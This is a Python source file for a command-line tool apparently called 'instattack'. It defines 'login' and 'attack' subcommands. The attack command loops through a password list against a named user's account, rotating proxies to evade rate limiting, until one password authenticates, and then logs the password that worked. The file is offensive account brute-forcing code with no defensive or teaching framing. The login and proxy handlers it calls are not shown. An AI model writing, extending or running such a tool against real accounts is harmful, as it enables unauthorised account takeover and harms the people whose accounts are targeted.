import asyncio
from plumbum import cli

from instattack.lib import logger
from instattack.app.entrypoint import EntryPoint, BaseApplication
from instattack.app.proxies.handler import ProxyHandler

from .handler import LoginHandler


def post_handlers(user, config):

    lock = asyncio.Lock()
    start_event = asyncio.Event()
    auth_result_found = asyncio.Event()

    proxy_handler = ProxyHandler(
        config,
        lock=lock,
        start_event=start_event,
    )

    password_handler = LoginHandler(
        config,
        proxy_handler,
        user=user,
        start_event=start_event,
        stop_event=auth_result_found,
    )
    return proxy_handler, password_handler


@EntryPoint.subcommand('login')
class Login(BaseApplication):

    __name__ = 'Login'

    collect = cli.Flag("--collect", default=False)

    def main(self, username, password):
        log = logger.get_sync(__name__, subname='main')

        # Default Collect to False
        config = self.config()
        config.update({'proxies': {'pool': {'collect': self.collect}}})

        loop = asyncio.get_event_loop()

        user = self.get_user(loop, username)
        if not user:
            return

        result = loop.run_until_complete(self.test_login(
            loop, user, password, config
        ))
        log.complete(str(result))
        return 1

    async def test_login(self, loop, user, password, config):
        async with self.async_logger('test_login') as log:

            proxy_handler, password_handler = post_handlers(user, config)

            results = await asyncio.gather(
                password_handler.attempt_single_login(loop, password),
                proxy_handler.run(loop),
            )

            # We might not need to stop proxy handler.
            await log.debug('Stopping Proxy Handler...')
            await proxy_handler.stop(loop)

            await log.debug('Returning Result')
            return results[0]


@EntryPoint.subcommand('attack')
class Attack(BaseApplication):

    __name__ = 'Run Attack'

    # Overrides Password Limit Set in Configuration File
    limit = cli.SwitchAttr("--limit", int, mandatory=False,
        help="Limit the number of passwords to perform the attack with.")

    # Overrides Collect Flag Set in Configuration File
    collect = cli.Flag("--collect", default=False,
        help="Enable simultaneous proxy collection with Proxy Broker package.")

    def main(self, username):
        """
        Iteratively tries each password for the given user with the provided
        token until a successful response is achieved for each password or
        a successful authenticated response is achieved for any password.

        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        log = logger.get_sync(__name__, subname='main')

        # Default Collect to False
        config = self.config()
        config.update({'proxies': {'pool': {'collect': self.collect}}})

        # Override Password Limit if Set
        if self.limit:
            config.update({'login': {'limit': self.limit}})

        loop = asyncio.get_event_loop()

        user = self.get_user(loop, username)
        if not user:
            return

        # Result will only return if it is authorized.
        results = self.attack(loop, user, config)
        if results.has_authenticated:

            # This log right here is causing an error for an unknown reason...
            log.success(f'Authenticated {username}!', extra={
                'password': results.authenticated_result.password
            })
        else:
            log.error(f'User {username} Not Authenticated.')

    def attack(self, loop, user, config):

        async def _attack(loop, user, config):
            async with self.async_logger('attack') as log:

                proxy_handler, password_handler = post_handlers(user, config)

                results = await asyncio.gather(
                    password_handler.attack(loop),
                    proxy_handler.run(loop),
                )

                # We might not need to stop proxy handler.
                await log.debug('Stopping Proxy Handler...')
                await proxy_handler.stop(loop)

                await log.debug('Returning Result')
                return results[0]

        return loop.run_until_complete(_attack(loop, user, config))
